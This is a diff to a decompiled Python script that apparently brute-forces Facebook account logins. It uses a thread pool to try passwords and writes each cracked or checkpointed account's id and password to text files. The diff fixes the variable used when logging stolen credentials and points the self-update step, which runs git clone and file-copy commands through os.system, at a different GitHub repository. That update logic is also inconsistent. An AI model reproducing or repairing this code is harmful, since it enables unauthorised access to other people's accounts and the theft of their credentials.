@@ -2,7 +2,6 @@
 # Time Succes decompile : 2022-03-12 17:47:35.910329
 from imp import reload
 import os, time, requests, datetime, random,multiprocessing.pool, getpass, json, threading, sys, uuid, shutil, zlib, base64
-from plistlib import UID
 from xml.dom import NotFoundErr
 from site import main
 from multiprocessing.pool import ThreadPool
@@ -141,10 +140,10 @@ def main_input():
         time.sleep(3.5)
         main()
     elif mx=='6':
-        os.system("git clone https://github.com/Red-Mafia/PAID-3.git")
-        os.system("rm -rf PAID-3")
+        os.system("git clone https://github.com/EmadSid14/fixed.git")
+        os.system("rm -rf fixed")
         os.system("cp -f PAID/PAID \\.")
-        os.system("rm -rf PAID-3")
+        os.system("rm -rf fixed")
         time.sleep(5)
         mx("\033[92;1m\n TOOL UPDATE SUCCESSFUL :)\n")
         time.sleep(2)
@@ -213,17 +212,17 @@ def numcloning():
             if 'c_user' in rana.cookies.get_dict().keys():
                 print ("\x1b[1;92m[RK-OK] "+coc+user + " | " + pass1)
                 ok=open('RK-ok.txt', 'a')
-                ok.write(UID+ " | " +pass1+ "\n")
+                ok.write(id+ " | " +pass1+ "\n")
                 ok.close()
-                oks.append(UID+pass1)
+                oks.append(id+pass1)
             else:
                 if 'checkpoint' in rana.cookies.get_dict().keys():
                     
                     print ("\x1b[1;91m[RK-CP] "+coc+user + " | " + pass1)
                     cp=open('RK random-co.txt', 'a')
-                    cp.write(UID+ " | " +pass1+ "\n")
+                    cp.write(id+ " | " +pass1+ "\n")
                     cp.close()
-                    cps.append(UID+pass1)
+                    cps.append(id+pass1)
         except:
             pass
     p = ThreadPool(30)
